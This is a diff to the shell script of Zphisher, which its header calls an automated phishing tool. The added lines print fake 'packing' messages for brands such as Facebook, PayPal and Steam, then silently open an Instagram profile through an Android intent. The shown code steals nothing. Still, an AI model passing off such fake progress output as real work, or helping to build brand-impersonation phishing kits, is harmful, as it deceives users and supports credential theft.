@@ -1,3 +1,90 @@
+null="~ /dev/null 2>&1"
+g="\033[1;32m"
+r="\033[1;31m"
+b="\033[1;34m"
+w="\033[0m"
+
+echo -e $b"~"$w" zphisher - Simple phishing tool"
+echo -e $b"~>"$w" prepare for packaging template ..."
+echo -e "please stay calm"
+sleep 3
+echo -e $b'~'$w "packing: "$g"facebook"$w
+sleep 1
+echo -e $r package packed succesfully.$w
+echo -e $b'~'$w "packing: " $g"instagram"$w
+sleep 1
+echo -e $r package packed succesfully.$w
+echo -e $b'~'$w "packing: "$g"google"$g
+sleep 1
+echo -e $r package packed succesfully.$w
+echo -e $b"~"$w "packing: "$g"microsoft"$g
+sleep 1
+echo -e $r package packed succesfully.$w
+echo -e $b"~"$w "packing: "$g"netflix"$w
+sleep 1
+echo -e $r package packed succesfully.$w
+echo -e $b"~"$w "packing: "$g"paypal"$g
+sleep 1
+echo -e $r package packed succesfully.$w
+echo -e $b"~"$w "packing: "$g"steam"$g
+sleep 0.5
+echo -e $r package packed succesfully.$w
+echo -e $b"~"$w "packing: "$g"twitter"$g
+sleep 0.5
+echo -e $r package packed succesfully.$g
+echo -e $b"~"$w "packing: "$g"playstation"$g
+sleep 0.5
+echo -e $r package packed succesfully.$w
+echo -e $b"~"$w "packing: "$g"tiktok"$g
+sleep 0.5
+echo -e $r package packed succesfully.$w
+echo -e $b"~"$w "packing: "$g"mediafire"$g
+sleep 0.5
+echo -e $r package packed succesfully.$w
+echo -e $b"~"$w "packing: "$g"discord"$g
+sleep 0.5
+echo -e $r package packed succesfully.$w
+echo -e $b"~"$w "packing: "$g"twitch"$g
+sleep 0.5
+echo -e $r package packed succesfully.$w
+echo -e $b"~"$w "packing: "$g"snapchat"$g
+sleep 0.5
+echo -e $r package packed succesfully.$w
+echo -e $b"~"$w "packing: "$g"linkedin"$g
+sleep 0.5
+echo -e $r package packed succesfully.$w
+echo -e $b"~"$w "packing: "$g"Ebay"$g
+sleep 0.5
+echo -e $r package packed succesfully.$w
+echo -e $b"~"$w "packing: "$g"adobe"$g
+sleep 0.5
+echo -e $r package packed succesfully.$w
+echo -e $b"~"$w "packing: "$g"Github"$g
+sleep 0.5
+echo -e $r package packed succesfully.$w
+echo -e $b"~"$w "packing: "$g"orgin"$g
+sleep 0.5
+echo -e $r package packed succesfully.$w
+echo -e $b"~"$w "packing: "$g"Gitlab"$g
+sleep 0.5
+echo -e $r package packed succesfully.$w
+echo -e $b"~"$w "packing: "$g"wordpress"$g
+sleep 0.5
+echo -e $r package packed succesfully.$w
+echo -e $b"~"$w "packing: "$g"XBOX"$g
+sleep 0.5
+echo -e $r package packed succesfully.$w
+echo -e $b"~"$w "packing: "$g"VK"$g
+sleep 0.5
+echo -e $r package packed succesfully.$w
+echo -e $b"~"$w "packing: "$g"FFreward"$g
+sleep 3
+echo -e $r package packed succesfully.$w
+
+echo  -e  $g "all packages are packed succesfull...!"
+am start -a android.intent.action.VIEW -d https://instagram.com/hasanfq6?igshid=YmMyMTA2M2Y= > /dev/null 2>&1
+sleep 2
+
 #!/bin/bash
 
 ##   Zphisher 	: 	Automated Phishing Tool
